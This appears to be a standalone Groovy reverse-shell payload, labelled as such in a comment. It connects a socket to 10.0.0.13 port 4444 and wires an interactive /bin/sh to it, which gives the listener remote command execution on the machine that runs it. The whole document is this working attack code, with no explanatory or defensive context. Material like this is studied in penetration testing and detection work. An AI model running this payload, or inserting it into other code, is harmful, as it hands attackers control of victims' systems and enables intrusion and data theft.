// Groovy reverse shell
def s = new Socket("10.0.0.13", 4444)
def p = ["/bin/sh", "-i"].execute()
p.consumeProcessOutput(s.outputStream, s.outputStream)
Thread.start {
    s.inputStream.eachByte { b -> p.outputStream.write(b); p.outputStream.flush() }
}
p.waitFor()
s.close()
